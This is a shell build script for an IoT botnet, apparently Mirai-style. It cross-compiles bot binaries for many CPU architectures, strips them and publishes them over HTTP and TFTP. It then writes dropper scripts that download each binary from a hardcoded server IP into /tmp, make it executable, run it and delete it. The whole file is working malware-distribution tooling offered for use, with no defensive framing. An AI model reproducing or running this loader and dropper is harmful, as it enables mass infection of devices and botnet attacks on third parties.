dir="bot/*.c"
binname="ceph" #Binname Pre-fix || Change To Random Thing
serverip="107.189.4.187"
execname=".ceph" #Execution Name

arc_compile() {
    "$1-linux-gcc" -std=c99 -DBOT_BINARIES="$1" $dir -s -o eggs/"$2"
}

arm7_compile() {
    "$1-gcc" -Wall -std=c99 -DBOT_BINARIES="$1" $dir -s -o eggs/"$2"
}

compile_bot() {
    "$1-gcc" $3 $dir -Wall -std=c99 -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o eggs/"$2" -DBOT_BINARIES=\""$1"\"
    "$1-strip" eggs/"$2" -S --strip-unneeded --strip-all --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=
}	

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/arc/bin

#export GOROOT=/usr/local/go;
#export GOPATH=$HOME/Projects/Proj1;
#export PATH=$GOPATH/bin:$GOROOT/bin:$PATH;
#go get github.com/go-sql-driver/mysql;
#go get github.com/mattn/go-shellwords

echo "EXPORTED CEPH EGGS"

rm -rf eggs
mkdir eggs &>/dev/null
mkdir /var/www/html/boiledeggs &>/dev/null

compile_bot x86_64 $binname.x86 "-static"
compile_bot mips $binname.mips "-static"
compile_bot mipsel $binname.mpsl "-static"
compile_bot armv4l $binname.arm "-static"
compile_bot armv5l $binname.arm5 "-static"
compile_bot armv6l $binname.arm6 "-static"
arm7_compile armv7l $binname.arm7 "-static"
compile_bot powerpc $binname.ppc "-static"
compile_bot sparc $binname.spc "-static"
compile_bot m68k $binname.m68k "-static"
compile_bot sh4 $binname.sh4 "-static"
arc_compile arc $binname.arc "-static"

echo "COMPILED CEPH EGGS"

cp eggs/$binname.* /var/www/html/boiledeggs
#cp eggs/$binname.* /var/www/html
cp eggs/$binname.* /tftpboot

echo "binarys=\"mips mpsl arm arm5 arm6 arm7 sh4 ppc x86 arc\"
server_ip=\""$serverip"\"
binname=\""$binname"\"
execname=\""$execname"\"
for arch in \$binarys
do
cd /tmp
wget http://\$server_ip/\$binname.\$arch -O \$execname
chmod 777 \$execname
./\$execname \$1
rm -rf \$execname
done" > /var/www/html/sh

echo "binarys=\"mips mpsl arm arm5 arm6 arm7 sh4 ppc x86 arc\"
server_ip=\""$serverip"\"
binname=\""$binname"\"
execname=\""$execname"\"}

for arch in \$binarys
do
cd /tmp
tftp -g -l \$execname -r \$binname.\$arch \$server_ip
chmod 777 \$execname
./\$execname \$1
rm -rf \$execname
done" > /tftpboot/sh

echo "FINISHED CEPH EGGS"
echo "PLEASE ENJOY THE EGGS OF BOILEDNESS"

#systemctl restart apache2
